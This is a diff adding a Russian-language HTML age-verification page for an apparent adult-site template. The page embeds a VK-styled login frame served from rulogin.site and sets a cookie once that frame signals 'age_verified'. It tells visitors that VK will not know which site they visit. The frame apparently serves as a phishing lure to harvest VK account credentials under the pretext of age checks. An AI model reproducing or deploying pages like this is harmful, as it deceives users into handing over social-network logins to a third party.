@@ -1,0 +1,42 @@
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1, maximum-scale=3">
+		<title>Подтвердите возраст 18+</title>
+		<style>
+			body {font-family: -apple-system, BlinkMacSystemFont, Verdana, Roboto, "Helvetica Neue", sans-serif; font-size: 16px; background-color: #edeef0; color: #000000}
+			h1 {font-size: 26px}
+			h1 > .flag {width:32px;border-radius:4px}
+			h1, h2, h3 {text-align: center}
+			.logo-container {text-align: left}
+			.blur {filter: blur(4px)}
+			.age-verification { text-align: center; padding: 21px; margin: 25vh auto; line-height: 42px; max-width: 950px; }
+			.button-vk-iframe { background: transparent; width: 100%; height: auto; border: none; overflow: hidden; margin: 18px auto; }
+			@media (max-width: 824px) {
+				.age-verification { text-align: center; padding: 8px; margin: 10vh auto; line-height: 36px; font-size: 14px; }
+				.button-vk-iframe { width: 100%; height: auto; border: none; overflow: hidden; margin: 14px auto; }
+			}
+
+		</style>
+		<script type="text/javascript">
+			window.addEventListener('message', function(event) {
+				console.log('got message', event.data, event.origin);
+				if (event.origin.indexOf('rulogin.') === -1) { return; }
+				
+				if(event.data === 'age_verified') {
+					var now = new Date();
+					now.setTime(now.getTime() + 30 * 24 * 3600 * 1000);
+					document.cookie = "age_verified=1; expires=" + now.toUTCString() + "; path=/";
+					location.reload();
+				}
+			}, false);
+		</script>
+	</head>
+	<body>
+				<div class="logo-container blur"><img src="/hot-matures-template/site_logo.png" /></div>
+		<h1>Мы просим Вас <b>подтвердить совершеннолетие</b> во избежание блокировки на территории РФ <img src="/flags/ru.svg" class="flag" /></h1>
+		<iframe class="button-vk-iframe" border="0" style="height: 140px" allowtransparency="true" scrolling="no" src="https://rulogin.site/" > </iframe>
+
+		<h3 style="margin-bottom: 8px"> VK и РФ <b>не знают, куда вы заходите. Ваше имя не запрашивается.</b> </h3>
+			</body>
+</html>
